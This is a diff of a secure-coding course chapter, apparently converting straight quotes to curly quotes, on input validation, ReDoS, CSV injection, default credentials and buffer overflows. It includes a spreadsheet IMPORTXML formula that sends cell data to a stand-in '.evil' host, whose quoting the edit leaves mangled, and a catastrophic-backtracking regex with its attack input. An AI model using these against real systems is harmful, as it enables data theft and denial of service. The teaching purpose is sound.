-Regular expressions can do much more, though. If you follow a pattern with "**&#42;**", that means “*0 or more times*”. So the regex pattern “**a&#42;b&#42;x**” describes a pattern of 0 or more **a**’s, followed by 0 or more **b**’s, followed by **x**. This pattern matches strings like “**aabx**”, “**bbbx**”, and “**abx**”, but not “**bax**” or “**aabb**”. Most regex implementations also support “**+**” for “*1 or more times*” and “**?**” for “*0 or 1 times*”. Most regex implementations also let you use parentheses to group expressions, for example, “**f(abc)&#42;d**” matches if there is an “**f**”, followed by 0 or more instances of the sequence “**abc**”, followed by the letter “**d**”.
+Regular expressions can do much more, though. If you follow a pattern with “**&#42;**”, that means “*0 or more times*”. So the regex pattern “**a&#42;b&#42;x**” describes a pattern of 0 or more **a**’s, followed by 0 or more **b**’s, followed by **x**. This pattern matches strings like “**aabx**”, “**bbbx**”, and “**abx**”, but not “**bax**” or “**aabb**”. Most regex implementations also support “**+**” for “*1 or more times*” and “**?**” for “*0 or 1 times*”. Most regex implementations also let you use parentheses to group expressions, for example, “**f(abc)&#42;d**” matches if there is an “**f**”, followed by 0 or more instances of the sequence “**abc**”, followed by the letter “**d**”.
 
-You can usually do a case-insensitive match through some option. Make sure you set the locale if you use case-insensitive matching, since different languages have different rules, and sometimes the rules can be complex. For example, in German the lowercase "sharp-s" character "**ß**" is equivalent to the uppercase "**SS**" when using a case-insensitive match. In some cases, you may only want to do “*ASCII case-insensitive matching*”; this compares a sequence of code points as if all ASCII code points in the range 0x41 to 0x5A (A to Z) were mapped to the corresponding code points in the range 0x61 to 0x7A (a to z).
+You can usually do a case-insensitive match through some option. Make sure you set the locale if you use case-insensitive matching, since different languages have different rules, and sometimes the rules can be complex. For example, in German the lowercase “sharp-s” character “**ß**” is equivalent to the uppercase “**SS**” when using a case-insensitive match. In some cases, you may only want to do “*ASCII case-insensitive matching*”; this compares a sequence of code points as if all ASCII code points in the range 0x41 to 0x5A (A to Z) were mapped to the corresponding code points in the range 0x61 to 0x7A (a to z).
 
 There is far more to regexes. In fact, there is a whole book on just regular expressions, [*Mastering Regular Expressions, 3rd Edition*](https://www.oreilly.com/library/view/mastering-regular-expressions/0596528124/), by Jeffrey Friedl (2006), and there are many tutorials on regexes such as the  [Regular Expressions for Regular Folk](https://refrf.shreyasminocha.me/) tutorial by Shreyas Minocha. But that introduction will get us started, because we are now going to discuss how regexes can be used for input validation.
 
@@ -1453,17 +1453,17 @@ Regular expressions were originally used in software for *searching* for text pa
 
 #### Match, Don’t Search
 
-A key issue with regexes is that by default most regex implementations *search* to see if a given pattern can be found anywhere within some text. When we are doing input validation we don’t want to search; we want to know if all the text input *exactly matches* a pattern. That means we need to be able to ask the regex implementation *"does this input text exactly match this pattern"* - and reject the input if it doesn’t match. As with any other input validation, we need to make our pattern as limiting as possible, and if the input doesn’t match, then reject the input.
+A key issue with regexes is that by default most regex implementations *search* to see if a given pattern can be found anywhere within some text. When we are doing input validation we don’t want to search; we want to know if all the text input *exactly matches* a pattern. That means we need to be able to ask the regex implementation *“does this input text exactly match this pattern”* - and reject the input if it doesn’t match. As with any other input validation, we need to make our pattern as limiting as possible, and if the input doesn’t match, then reject the input.
 
-The usual way to require a regex to match an entire input is to include *anchors* in the regex. Just start your regex pattern with a *start anchor* - usually represented by "**^**" or sometimes “**\A**” - and end the pattern with “**$**” or sometimes “**\z**”. With these, the entire input must match the pattern. For example, this regex will match *any* text that contains “**cab**”, “**car**”, or “**cat**” - it will even match “**abdicate**” - so you should *not* use a regex like this for input validation:
+The usual way to require a regex to match an entire input is to include *anchors* in the regex. Just start your regex pattern with a *start anchor* - usually represented by “**^**” or sometimes “**\A**” - and end the pattern with “**$**” or sometimes “**\z**”. With these, the entire input must match the pattern. For example, this regex will match *any* text that contains “**cab**”, “**car**”, or “**cat**” - it will even match “**abdicate**” - so you should *not* use a regex like this for input validation:
 
 **ca[brt]**
 
-In contrast, this regex will only match *exactly* the words "**cab**", “**car**”, or “**cat**” in most regex implementations, because “**^**” means *“match the beginning”* and “**$**” means *“match the end”*:
+In contrast, this regex will only match *exactly* the words “**cab**”, “**car**”, or “**cat**” in most regex implementations, because “**^**” means *“match the beginning”* and “**$**” means *“match the end”*:
 
 **^ca[brt]$**
 
-In some implementations (depending on the option), "**^**" may mean *“beginning of any line”* not *“beginning of the string”* - and you usually want *“beginning of the string”*. A similar thing can happen with “**$**”. From here on we will assume that “**^**” and “**$**” mean beginning and end of the entire string.
+In some implementations (depending on the option), “**^**” may mean *“beginning of any line”* not *“beginning of the string”* - and you usually want *“beginning of the string”*. A similar thing can happen with “**$**”. From here on we will assume that “**^**” and “**$**” mean beginning and end of the entire string.
 
 #### Know Your Regex Implementation
 
@@ -1473,31 +1473,31 @@ There are three major families of regex language notations:
 
 1. Basic regular expression (BRE)<br>This is the default for **grep** and **sed**. This is defined by the POSIX standard. However, its syntax is sometimes a little awkward, so in most cases, it is easier to use extended regular expressions instead for input validation.
 
-2. Extended regular expression (ERE)<br>This is defined by the POSIX standard and adds capabilities like using parentheses for grouping and "**+**" for *“one or more”*. This is often used in C programs. So for example, “**[B-D]+**” means *“one or more of the letters B, C, or D”*.
+2. Extended regular expression (ERE)<br>This is defined by the POSIX standard and adds capabilities like using parentheses for grouping and “**+**” for *“one or more”*. This is often used in C programs. So for example, “**[B-D]+**” means *“one or more of the letters B, C, or D”*.
 
-3. Perl Compatible Regular Expressions (PCRE)<br>This is mostly an extension of the ERE format; many other programming languages use this family of regex languages. It includes capabilities like "**\d**" to represent digits.
+3. Perl Compatible Regular Expressions (PCRE)<br>This is mostly an extension of the ERE format; many other programming languages use this family of regex languages. It includes capabilities like “**\d**” to represent digits.
 
  Here are some important things that vary:
 
 * Sometimes there is an option or alternative method to match the entire input; if available, you can use that instead of the anchoring symbols. Make sure it matches the whole thing, though; some methods only check the beginning.
 
-* Sometimes "**^**" matches the beginning of the whole data, while in others it represents the beginning of any line in the data. The same goes for “**$**”. This is often controlled by a *multiline* option.
+* Sometimes “**^**” matches the beginning of the whole data, while in others it represents the beginning of any line in the data. The same goes for “**$**”. This is often controlled by a *multiline* option.
 
-* The "**.**" for representing *“any character”* doesn’t always match the newline character (**\n**); often there is an option to turn this on or off.
+* The “**.**” for representing *“any character”* doesn’t always match the newline character (**\n**); often there is an option to turn this on or off.
 
 * Does it properly support Unicode and the encoding you are using?
 
 * Can it handle data with the **NUL** character (byte value 0) within the data? If not, and your input data could have an embedded **NUL** character, you will need to validate the data first to make sure there are no **NUL** characters before passing the data to the regex implementation.
 
-* Is matching case-sensitive? Usually it is case-sensitive by default, and there is a trivial way to make it case-insensitive. If it is case-insensitive, remember that exactly what characters have case-insensitive matches depends on the locale. For example, "**I**" and “**i**” match in the English (“**en**”) and the C locale (“**C**”), but not in the Turkish (“**tr**”). In the Turkish locale, the Unicode LATIN CAPITAL LETTER I matches the LATIN SMALL LETTER DOTLESS I - not a lowercase “**i**”.
+* Is matching case-sensitive? Usually it is case-sensitive by default, and there is a trivial way to make it case-insensitive. If it is case-insensitive, remember that exactly what characters have case-insensitive matches depends on the locale. For example, “**I**” and “**i**” match in the English (“**en**”) and the C locale (“**C**”), but not in the Turkish (“**tr**”). In the Turkish locale, the Unicode LATIN CAPITAL LETTER I matches the LATIN SMALL LETTER DOTLESS I - not a lowercase “**i**”.
 
-In some languages, such as in Ruby, you normally use **\A** and **\z** instead of "**^**" and “**$**” to match string begin/end, because “**^**” and “**$**” match line begin/end instead.
+In some languages, such as in Ruby, you normally use **\A** and **\z** instead of “**^**” and “**$**” to match string begin/end, because “**^**” and “**$**” match line begin/end instead.
 
 #### Branch Priority
 
-Almost all regex implementations support *branches* - that is, "**aa|bb|cc**" matches **aa**, **bb**, or **cc**. All ERE and PCRE implementations support branches, and even some BRE implementations support branches if they are written as “**&#92;|**” instead of “**|**”. The *priority* of the branch operation is standard, but it is not what some users expect. The regex “**^aa|bb$**” means *“either it begins with aa OR it ends with bb”*, not *“exactly aa or bb”*.  When you are using regexes for input validation, a sequence of branches that is not surrounded by parentheses is practically always a mistake. What you normally want is “**^(aa|bb)$**” which means *“exactly aa or bb”*.
+Almost all regex implementations support *branches* - that is, “**aa|bb|cc**” matches **aa**, **bb**, or **cc**. All ERE and PCRE implementations support branches, and even some BRE implementations support branches if they are written as “**&#92;|**” instead of “**|**”. The *priority* of the branch operation is standard, but it is not what some users expect. The regex “**^aa|bb$**” means *“either it begins with aa OR it ends with bb”*, not *“exactly aa or bb”*.  When you are using regexes for input validation, a sequence of branches that is not surrounded by parentheses is practically always a mistake. What you normally want is “**^(aa|bb)$**” which means *“exactly aa or bb”*.
 
-**🚩 So, whenever you have a branch ("|") in a regex, group the whole expression with branches using parentheses.**
+**🚩 So, whenever you have a branch (“|”) in a regex, group the whole expression with branches using parentheses.**
 
 #### Test Input Validators
 
@@ -1505,7 +1505,7 @@ Again, you should know what your software should not accept, and use some of tho
 
 ### Quiz 1.4
 
-\>\>Which of the following matches only "1 or more lowercase Latin letters" using an extended regular expression (given the POSIX locale)?<<
+\>\>Which of the following matches only “1 or more lowercase Latin letters” using an extended regular expression (given the POSIX locale)?<<
 
 (!) **[a-z]&#42;**
 
@@ -1517,7 +1517,7 @@ Again, you should know what your software should not accept, and use some of tho
 
 [Explanation]
 
-Remember, **^...$** are required to make this an allowlist (the text *must* match the pattern), and "**+**" means *“one or more”*.
+Remember, **^...$** are required to make this an allowlist (the text *must* match the pattern), and “**+**” means *“one or more”*.
 
 [Explanation]
 
@@ -1531,21 +1531,21 @@ The reason that the ReDoS vulnerability is possible is that most regex implement
 
 NFA implementations of regexes - and that is most of them - *backtrack* whenever they fail a specific match until they either find a match or have tried all possibilities. In short, in the worst case they try *all* combinations. For many regular expression patterns this worst case is not a problem. However, certain kinds of regex patterns can make this worst case really bad. In particular, let’s imagine that we provide a pattern where:
 
-1. The regex pattern uses repetition on complex subexpressions (the use of "**+**" and “**&#42;**” on complex subexpressions), and
+1. The regex pattern uses repetition on complex subexpressions (the use of “**+**” and “**&#42;**” on complex subexpressions), and
 
 2. Within these repeated subexpressions, there are additional repetition symbols and expressions that match a suffix of another match. ([OWASP ReDoS](https://owasp.org/www-community/attacks/Regular_expression_Denial_of_Service&#95;-&#95;ReDoS))
 
-A trivial example is the regex pattern "**^(a+)+$**". Let’s imagine that an attacker provided the input value ”**aaaaX**”. An NFA will match the input first letter “**a**” with the “a” in the pattern easily, but then the regex implementation has two options: should it try to apply the *inner* “**+**” or the *outer* “**+**” to the next letter? Most implementations would try the inner one first, and then backtrack as needed. In the worst case, an NFA has to try out *all* possible combinations. Thus, to determine if the input “**aaaaX**” matches the pattern, an NFA regex has to try out 16 possible paths (all possibilities), with each one eventually failing because of the trailing “**X**”. If the attacker provides the input “**aaaaaaaaaaaaaaaaX**” there would be 65536 possible paths, with the number of paths doubling for each additional “**a**”. If an attacker provided 80 ‘**a**’s followed by **X**, that thread will try to process all combinations, which would take so long that it would become a denial-of-service. 
+A trivial example is the regex pattern “**^(a+)+$**”. Let’s imagine that an attacker provided the input value ”**aaaaX**”. An NFA will match the input first letter “**a**” with the “a” in the pattern easily, but then the regex implementation has two options: should it try to apply the *inner* “**+**” or the *outer* “**+**” to the next letter? Most implementations would try the inner one first, and then backtrack as needed. In the worst case, an NFA has to try out *all* possible combinations. Thus, to determine if the input “**aaaaX**” matches the pattern, an NFA regex has to try out 16 possible paths (all possibilities), with each one eventually failing because of the trailing “**X**”. If the attacker provides the input “**aaaaaaaaaaaaaaaaX**” there would be 65536 possible paths, with the number of paths doubling for each additional “**a**”. If an attacker provided 80 ‘**a**’s followed by **X**, that thread will try to process all combinations, which would take so long that it would become a denial-of-service. 
 
-We use the term *vulnerable regexes* for regex patterns with this awful worst-case behavior. A common industry term for these patterns is *evil regexes*. It is not that the regex is provided by an attacker necessarily, it is just that their worst-case behavior is "evil" and this makes them vulnerable to attack. Another term for this behavior is *catastrophic backtracking*.
+We use the term *vulnerable regexes* for regex patterns with this awful worst-case behavior. A common industry term for these patterns is *evil regexes*. It is not that the regex is provided by an attacker necessarily, it is just that their worst-case behavior is “evil” and this makes them vulnerable to attack. Another term for this behavior is *catastrophic backtracking*.
 
 There are many solutions to this problem, including the following:
 
-1. Use a regex implementation that uses a DFA. DFA-based implementations are not vulnerable to this problem. For example, in the NPM ecosystem, "**re2**" implements a DFA regex engine. However, DFA-based regex engines are generally less capable and in many environments are much more trouble to install and use, so this is rarely done.
+1. Use a regex implementation that uses a DFA. DFA-based implementations are not vulnerable to this problem. For example, in the NPM ecosystem, “**re2**” implements a DFA regex engine. However, DFA-based regex engines are generally less capable and in many environments are much more trouble to install and use, so this is rarely done.
 
-2. Modify the regex so that it doesn’t have this worst-case behavior. This is the usual approach. Be especially wary of any group "**(...)**" that contains a branch and/or ends with a repeat and is itself repeated.
+2. Modify the regex so that it doesn’t have this worst-case behavior. This is the usual approach. Be especially wary of any group “**(...)**” that contains a branch and/or ends with a repeat and is itself repeated.
 
-    1. If there is a repeat or branch in a regex that is itself repeated, rewrite the regex so the next character in the input would unambiguously determine if the repeat continues or not. E.g., rewrite "**^(a+)+$**" as “**^a+$**”.
+    1. If there is a repeat or branch in a regex that is itself repeated, rewrite the regex so the next character in the input would unambiguously determine if the repeat continues or not. E.g., rewrite “**^(a+)+$**” as “**^a+$**”.
 
     2. Another approach is to use mechanisms that tell the regex engine not to backtrack; many regex implementations have *possessive quantifiers* and/or *atomic grouping* which can prevent unnecessary backtracking.
 
@@ -1656,11 +1656,11 @@ Although this is potentially a big topic, in practice, the key is often to use a
 
 #### CSV
 
-The "comma separated value" (CSV) format is in theory simple. Every line is a record, where fields are separated by commas. The first line is usually a “header line” - the field names separated by commas (you should always provide the header, since this makes the CSV file more extensible and much easier to handle with other tools).
+The “comma separated value” (CSV) format is in theory simple. Every line is a record, where fields are separated by commas. The first line is usually a “header line” - the field names separated by commas (you should always provide the header, since this makes the CSV file more extensible and much easier to handle with other tools).
 
-In practice, there is a lot of variation in CSV formats. However, for security, the *bigger* problem is that some tools (such as Microsoft Excel and LibreOffice) will *execute* certain constructs when they read CSV, even if CSV looks like a data-only format. For example, a field value beginning with "**=**" is interpreted as “*execute these functions*”, and functions can access external data. In some spreadsheet implementations, the field contents "**=IMPORTXML(CONCAT(""http://some-server-with-log.evil?v="", CONCATENATE(A2:E2)), ""//a"")**" will *send* data from the spreadsheet to an external site. The solution, as always, is to validate each field value before accepting it. Especially problematic values are those beginning with **=**, **+**, **-**, and **@**.
+In practice, there is a lot of variation in CSV formats. However, for security, the *bigger* problem is that some tools (such as Microsoft Excel and LibreOffice) will *execute* certain constructs when they read CSV, even if CSV looks like a data-only format. For example, a field value beginning with “**=**” is interpreted as “*execute these functions*”, and functions can access external data. In some spreadsheet implementations, the field contents “**=IMPORTXML(CONCAT(“"http://some-server-with-log.evil?v="”, CONCATENATE(A2:E2)), “"//a"”)**” will *send* data from the spreadsheet to an external site. The solution, as always, is to validate each field value before accepting it. Especially problematic values are those beginning with **=**, **+**, **-**, and **@**.
 
-When reading these formats from an untrusted source, ensure that each cell meets the expected data format, and don’t pass on the data otherwise. Be especially wary of cells beginning with "**=**", and try to avoid passing them on, since some tools may execute their contents.
+When reading these formats from an untrusted source, ensure that each cell meets the expected data format, and don’t pass on the data otherwise. Be especially wary of cells beginning with “**=**”, and try to avoid passing them on, since some tools may execute their contents.
 
 #### JSON
 
@@ -1672,7 +1672,7 @@ If you want to go further, there are formats such as JSON Schema that let you de
 
 Sometimes you need to accept file uploads of special file types (e.g., of images).
 
-If your program allows uploads, try to limit uploads to specific file types and make sure (via both its MIME type and its contents) that it is one of the valid types that you will accept. Limit what you allow in the filename, too; alphanumeric characters are generally fine, but anything else (especially "**/**" and “**&#92;**”) can be problematic, so only allow the characters you are certain will be fine. Where possible, define an acceptlist of allowed filename suffixes, and only allow uploads of files named with one of those allowed suffixes.
+If your program allows uploads, try to limit uploads to specific file types and make sure (via both its MIME type and its contents) that it is one of the valid types that you will accept. Limit what you allow in the filename, too; alphanumeric characters are generally fine, but anything else (especially “**/**” and “**&#92;**”) can be problematic, so only allow the characters you are certain will be fine. Where possible, define an acceptlist of allowed filename suffixes, and only allow uploads of files named with one of those allowed suffixes.
 
 🔔 Inadequate restriction of uploads is such a common cause of security vulnerabilities that it is 2019 CWE Top 25 #16. It is identified as [CWE-434](https://cwe.mitre.org/data/definitions/434.html), *Unrestricted Upload of File with Dangerous Type*.
 
@@ -1686,7 +1686,7 @@ If your program allows uploads, try to limit uploads to specific file types and 
 
 ### Minimizing Attack Surface, Authentication, and Authorization
 
-In the Design chapter (in Part I of this course), we noted that it is important to minimize the *attack surface* - that is, the interfaces the attacker can get access to. This does not mean "limit the interfaces that you *intend* for users to use"; your *implementation* must limit the interfaces an attacker has access to. Try to make it so attackers cannot even *access* most interfaces, then carefully protect the interfaces that are accessible.
+In the Design chapter (in Part I of this course), we noted that it is important to minimize the *attack surface* - that is, the interfaces the attacker can get access to. This does not mean “limit the interfaces that you *intend* for users to use"; your *implementation* must limit the interfaces an attacker has access to. Try to make it so attackers cannot even *access* most interfaces, then carefully protect the interfaces that are accessible.
 
 That said, in many systems, attackers will be able to attempt some requests. In those cases, you will need to make sure that the request is authorized before it is honored. Remember, authorization means determining whether or not that request is allowed to that person or program.
 
@@ -1716,7 +1716,7 @@ We will later discuss various tools for verification. While tools can help find 
 
 Some execution environments, like client-side JavaScript, don’t have environment variables. In most other environments (client and server), environment variables exist, but are typically considered trusted (that is, environment variables can only be set by someone with authorization to set them).
 
-Some historical operating systems had insecure settings of environment variables. One of the most common cases is that old operating systems had an unsafe **PATH** environment variable setting by default (this is used when searching for executables). In these systems, **PATH** might be set so the current directory "**.**" was searched for executables before more trustworthy directories. It is true that some naive users set their **PATH** variable to such values, but thankfully this kind of mistake is less common today.
+Some historical operating systems had insecure settings of environment variables. One of the most common cases is that old operating systems had an unsafe **PATH** environment variable setting by default (this is used when searching for executables). In these systems, **PATH** might be set so the current directory “**.**” was searched for executables before more trustworthy directories. It is true that some naive users set their **PATH** variable to such values, but thankfully this kind of mistake is less common today.
 
 However, if you are writing something called a **setuid** or **setgid** program, then *environment variables can come from an attacker*. A little introduction is probably in order. Unix-like systems (including Linux and MacOS) allow programs to be **setuid** and/or **setgid**. When a **setuid** program runs, it has the privileges of its *owner* (not its requestor). A **setgid** program runs with the privileges of its *group* (not the groups of its requestor). These kinds of programs inherit many inputs from a potential attacker, including the current directory value and environment variables. One solution is to not write a **setuid** or **setgid** program, as in many cases that approach is not needed today.
 
@@ -1724,7 +1724,7 @@ If you *do* write a **setuid**/**setgid** program, your program must protect its
 
 Here are some other possible measures:
 
-* On startup, examine **PATH** for common errors such as including a blank directory or "**.**" before system paths like **/usr/bin**. You might halt, or at least warn, if that happens.
+* On startup, examine **PATH** for common errors such as including a blank directory or “**.**” before system paths like **/usr/bin**. You might halt, or at least warn, if that happens.
 
 * Use full path names when calling executable programs, to make sure you are calling the right ones. This is a plausible hardening mechanism, but it is easy to miss one, and this does make it harder to port software between systems.
 
@@ -1770,7 +1770,7 @@ Some systems try to depend on *secure boot* or similar mechanisms to ensure that
 
 [Explanation]
 
-Absolutely not. If there is a standard known password, it will be immediately posted on the World Wide Web, and all attackers will use that password when trying to attack those systems. Many users will not read documentation. For an application to be secure, it needs to be "secure by default"; an application with a known preset password is *insecure* by default. One alternative would be to have a “please create your password” prompt when the application is first used.
+Absolutely not. If there is a standard known password, it will be immediately posted on the World Wide Web, and all attackers will use that password when trying to attack those systems. Many users will not read documentation. For an application to be secure, it needs to be “secure by default"; an application with a known preset password is *insecure* by default. One alternative would be to have a “please create your password” prompt when the application is first used.
 
 [Explanation]
 
@@ -1784,7 +1784,7 @@ But once you start considering availability as a risk management problem, things
 
 #### Try to Eliminate Easily Amplified Inputs
 
-A useful concept is the idea of leverage. *"In the context of a DoS attack, if a vulnerability has high leverage it means attackers can consume a ton of your server resources with minimal resources… the higher the leverage, the higher the risk, and the more likely I am to address the issue directly. The lower the leverage, the more likely I’ll accept the risk and/or lean on [other] mitigations."* ([*Not all attacks are equal: understanding and preventing DoS in web applications*](https://r2c.dev/blog/2020/understanding-and-preventing-dos-in-web-apps/), by Jacob Kaplan-Moss, 2020)
+A useful concept is the idea of leverage. *“In the context of a DoS attack, if a vulnerability has high leverage it means attackers can consume a ton of your server resources with minimal resources… the higher the leverage, the higher the risk, and the more likely I am to address the issue directly. The lower the leverage, the more likely I’ll accept the risk and/or lean on [other] mitigations.”* ([*Not all attacks are equal: understanding and preventing DoS in web applications*](https://r2c.dev/blog/2020/understanding-and-preventing-dos-in-web-apps/), by Jacob Kaplan-Moss, 2020)
 
 Consider each kind of input your software receives. Is there any way an attacker can send a very small amount of input and consume a large amount of resources (e.g., computation and/or output)? These are often higher risk to availability, because these inputs are easily amplified.
 
@@ -1870,7 +1870,7 @@ Many programs have to use some secret information. An especially common kind of 
 
 Software should never be delivered with default credentials. There are endless web pages that track default credentials like **admin/admin**. Once anyone finds the credentials, they are likely to eventually end up on these listings. This will enable attackers to break into your software (if it is an inbound credential) or others’ software (if it is an outbound credential). If the software has many installations, then they may all be vulnerable at the same time. **Remember:** Users generally accept whatever is the default, and if the default is insecure, then the software will be insecure. Obfuscating the code is not enough; many attackers are quite adept at extracting and analyzing executables.
 
-The usual solution for this is to have a "first login" mode that detects that there is no credential (password or key) yet, and then lets the user create a unique one. That is assuming it needs to be stored at all; in some cases, you can simply ask the user to provide it each time.
+The usual solution for this is to have a “first login” mode that detects that there is no credential (password or key) yet, and then lets the user create a unique one. That is assuming it needs to be stored at all; in some cases, you can simply ask the user to provide it each time.
 
 #### Avoid Hardcoded Credentials, Store Them Safely Instead
 
@@ -1906,7 +1906,7 @@ Almost all programming languages support multiple data types, such as integers, 
 
 Sometimes it is necessary to convert or cast a data value from one type to another. The details depend on the programming language, but while it is necessary, incorrect conversions and casts end up causing a disproportionate number of vulnerabilities. The conversion can lose information, or lead to a new value that might have been completely unexpected. Any conversion or casting, especially one that might lose information, should be reviewed to consider if there is a risk to doing it. Some languages have a **const** qualifier for declaring constants; it is dangerous to cast away a **const** qualifier, because this allows changes to the value while other parts of the system may depend on it being constant.
 
-For our purposes, conversions do not include determining if a value is truthy. In general, programming languages have conditional constructs (such as **if** and **while**) that will produce different results depending on whether or not a condition’s value is truthy. What is truthy is a key design decision when creating a programming language. For example, every value in JavaScript is considered truthy except for a specific list of falsy values (currently **false**, **0**, **-0**, **0n**, **""**, **null**, **undefined**, and **NaN**). In such languages, **if p** and similar are a shorthand for checking if a value is truthy. This interpretation in conditionals might be considered a conversion from some other type into a boolean type, but such constructs are really just an abbreviated way to determine if a value is truthy, and that is not what we are concerned with here.
+For our purposes, conversions do not include determining if a value is truthy. In general, programming languages have conditional constructs (such as **if** and **while**) that will produce different results depending on whether or not a condition’s value is truthy. What is truthy is a key design decision when creating a programming language. For example, every value in JavaScript is considered truthy except for a specific list of falsy values (currently **false**, **0**, **-0**, **0n**, **“”**, **null**, **undefined**, and **NaN**). In such languages, **if p** and similar are a shorthand for checking if a value is truthy. This interpretation in conditionals might be considered a conversion from some other type into a boolean type, but such constructs are really just an abbreviated way to determine if a value is truthy, and that is not what we are concerned with here.
 
 🔔 *Incorrect Type Conversion or Cast* ([CWE-704](https://cwe.mitre.org/data/definitions/704.html)) is such a common cause of security vulnerabilities that it is 2019 CWE Top 25 #28.
 
@@ -1954,7 +1954,7 @@ One of the best-known attacker tricks is out-of-bounds reads and writes (includi
 
 #### Out-of-Bounds Reads/Writes and Buffer Overflow
 
-One of the most common kinds of security vulnerabilities is where a read or write is *"out of bounds"* inside memory-unsafe code. Such vulnerabilities are common, and attackers find them easy to exploit. This problem has been well-known for a long time; Aleph One (Elias Levy) describes in detail in [*Smashing the Stack for Fun and Profit*](http://phrack.org/issues/49/14.html#article) (1996) how to exploit such vulnerabilities.
+One of the most common kinds of security vulnerabilities is where a read or write is *“out of bounds”* inside memory-unsafe code. Such vulnerabilities are common, and attackers find them easy to exploit. This problem has been well-known for a long time; Aleph One (Elias Levy) describes in detail in [*Smashing the Stack for Fun and Profit*](http://phrack.org/issues/49/14.html#article) (1996) how to exploit such vulnerabilities.
 
 🔔 In fact, out-of-bounds reads and writes are so common and dangerous that in the 2019 CWE Top 25 Most Dangerous Software Errors list this is the #1 weakness ([CWE-119](https://cwe.mitre.org/data/definitions/119.html) *Improper Restriction of Operations within the Bounds of a Memory Buffer*), and specific cases of it are #5 ([CWE-125](https://cwe.mitre.org/data/definitions/125.html) *Out-of-bounds Read*) and #12 ([CWE-787](https://cwe.mitre.org/data/definitions/787.html) *Out-of-bounds Write*).
 
@@ -1984,7 +1984,7 @@ In C, any attempt to read or write outside the bounds of a buffer (via an array 
 
 In *practice*, if there is no memory safety, a write outside a buffer in most programming language implementations often ends up corrupting internal data structures that the program depends on. For example, it may overwrite local variables and/or change what will be run after a function returns. Similarly, a read outside a buffer often reveals internal information that is not normally revealed, including secrets that security (such as keys or hardening systems) depend on. In addition, if it is C or C++, compilers will often use such statements as a license to generate some very surprising machine code (because compiler authors are allowed to presume that such things will not happen). Attackers have honed their craft over decades to exploit these vulnerabilities, because they are common and they can often quickly turn discovery of this kind of vulnerability into a devastating attack.
 
-There are many names for these attacks, with varying terminology and meanings. One of the most common variations of this vulnerability is when the attacker can write past the end of an array, and this vulnerability is sometimes called a *classic buffer overflow* vulnerability. An attack that exploits this vulnerability by writing data outside a buffer is often called a *stack smashing attack* (if the buffer is on the stack, such as by being a local parameter) or a *heap smashing attack* (if the buffer is on the heap, that is, was previously allocated by **new** or **malloc** depending on the language). CWE has various identifiers and names, including [CWE-119](https://cwe.mitre.org/data/definitions/119.html) (*Improper Restriction of Operations within the Bounds of a Memory Buffer*), which is a special case of [CWE-118](https://cwe.mitre.org/data/definitions/118.html) (*Incorrect Access of Indexable Resource ('Range Error')*).
+There are many names for these attacks, with varying terminology and meanings. One of the most common variations of this vulnerability is when the attacker can write past the end of an array, and this vulnerability is sometimes called a *classic buffer overflow* vulnerability. An attack that exploits this vulnerability by writing data outside a buffer is often called a *stack smashing attack* (if the buffer is on the stack, such as by being a local parameter) or a *heap smashing attack* (if the buffer is on the heap, that is, was previously allocated by **new** or **malloc** depending on the language). CWE has various identifiers and names, including [CWE-119](https://cwe.mitre.org/data/definitions/119.html) (*Improper Restriction of Operations within the Bounds of a Memory Buffer*), which is a special case of [CWE-118](https://cwe.mitre.org/data/definitions/118.html) (*Incorrect Access of Indexable Resource (‘Range Error’)*).
 
 If an attacker can cause your program to write outside its buffer, this often results in a serious vulnerability where the attacker can cause the program to do anything at all.
 
@@ -2012,7 +2012,7 @@ If you have to program without memory safety checks, for whatever reason, then y
 
 Of course, just doing a check is not enough - what do you do when the check fails? The safest thing to do is to reject the input and not perform any action if a check fails along the way. However, it is often hard to do the rejection, and so developers are tempted to simply trim off any extra (or write code that accidentally does this). Sometimes that is fine, but this often means that an attacker can control what stays in the buffer and what doesn’t. That can sometimes lead to vulnerabilities, and determining if there is a vulnerability can be really difficult.
 
-If you use C, there are many patterns that are especially likely to be vulnerable, including the use of functions like **strcpy()** to copy a string, **strcat()** to concatenate a string, and loops that incrementally add to a buffer. Early in C’s development, functions were created that limited where data would be written, specifically **strncpy()** and **strncat()**. However, using **strncpy()** and **strncat()** requires constant recalculation of the *space left over*, making them difficult to use correctly (it is extremely easy to have an "off by one" error in this code that only attackers notice). The **strncpy()** function also overwrites all remaining space, making it absurdly inefficient for most circumstances.
+If you use C, there are many patterns that are especially likely to be vulnerable, including the use of functions like **strcpy()** to copy a string, **strcat()** to concatenate a string, and loops that incrementally add to a buffer. Early in C’s development, functions were created that limited where data would be written, specifically **strncpy()** and **strncat()**. However, using **strncpy()** and **strncat()** requires constant recalculation of the *space left over*, making them difficult to use correctly (it is extremely easy to have an “off by one” error in this code that only attackers notice). The **strncpy()** function also overwrites all remaining space, making it absurdly inefficient for most circumstances.
 
 If you use C, sometimes you can use safer functions instead. The C function **snprintf()** writes output to a string buffer given a format, and it will not overwrite past a given length. The function **memccpy()** lets you do a simple copy, again without going beyond a maximum length. However, in all these cases you cannot just call the function - in most cases, you also have to check its return value to see if there was an overrun, and if there was, do something sensible (which is usually to stop processing the input). The functions **asprintf()** and **vasprintf()** let you reallocate a new string, which you can use to resize a string. As always, you must ensure that you free any previously-allocated strings once they are no longer used, and ensure that you only free them once (a problem we will discuss more soon). If you are not prepared to do this very carefully and methodically, you probably should not be using C.
 
@@ -2022,11 +2022,11 @@ Modern compilers for these languages, and the operating systems that support the
 
 * Non-executable memory<br>Ensure that memory with executable instructions cannot also be written to at the same time, making it slightly harder for attackers to modify software or introduce their own malicious code.
 
-* Canaries<br>Insert an extra check in selected functions; before they return, they do a sanity check on a value called a "guard" or “canary” that detects certain kinds of buffer overflows that perform writes (the gcc and clang compilers can do this with options like **-fstack-protector**)
+* Canaries<br>Insert an extra check in selected functions; before they return, they do a sanity check on a value called a “guard” or “canary” that detects certain kinds of buffer overflows that perform writes (the gcc and clang compilers can do this with options like **-fstack-protector**)
 
 * Automated bounds insertions<br>Modify code during compilation to do bounds checking even if was not originally requested (the gcc and clang compilers can do this with the option **-D_FORTIFY_SOURCE=2**).
 
-If you are writing code that is not memory-safe, or calling code that is not memory-safe, make sure hardening measures like these are enabled whenever you can, including in compilation, test, and production. The good news is that hardening measures like these will slow down some exploits. But in the end, hardening measures often do not *prevent* exploits. In the best case, these hardening measures turn "take over program" into “program stops working”... and that is the *best* case. The only way to not have vulnerable code… is to not have vulnerable code.
